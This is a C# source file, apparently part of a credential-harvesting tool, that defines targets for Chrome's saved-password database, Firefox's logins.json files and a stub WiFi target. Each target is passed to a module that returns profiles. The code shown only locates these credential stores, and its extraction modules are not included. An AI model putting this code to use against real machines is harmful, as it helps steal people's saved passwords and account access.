using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;

namespace PS03
{
    public abstract class ITarget
    {
        public string Name { get; protected set; }
        protected IModule _module;
        public List<string> _paths;
        public abstract bool CheckFile();       

        public List<Profile> ExectueModule()
        {
            return _module.Execute(this); 
        }

    }

    public class Chrome : ITarget
    {

        public Chrome()
        {
            _paths = new List<string>() { Path.Combine(Environment.GetEnvironmentVariable("LocalAppData"),
                @"Google\Chrome\User Data\Default\Login Data")};
            Name = "Google Chrome";
            _module = new ChromeModule();
                
        }

        public override bool CheckFile()
        {
            return File.Exists(_paths[0]);
        }
    }

    public class Firefox : ITarget
    {

        private string localPath = Path.Combine(Environment.GetEnvironmentVariable("AppData"), @"Mozilla\Firefox\Profiles");
        public Firefox()
        {
            _paths = new List<string>();
            Name = "Firefox";
            _module = new FirefoxModule();


        }

        public override bool CheckFile()
        {
            if (!Directory.Exists(localPath)) return false;
            var jsonDirs = Directory.GetDirectories(localPath);
            foreach (var Profile in jsonDirs)
            {
                if (File.Exists(Profile + @"\logins.json"))
                {
                    _paths.Add(Profile + @"\logins.json");
                }
                   
            }
            if (_paths.Count > 0)
                return true;

            return false;
        }
    }

    public class WiFi : ITarget
    {
        public WiFi()
        {
            Name = "WiFi";
            _module = new WiFiModule();

        }
        public override bool CheckFile()
        {
            // Not implemented yet
            return true; 
        }
    }


}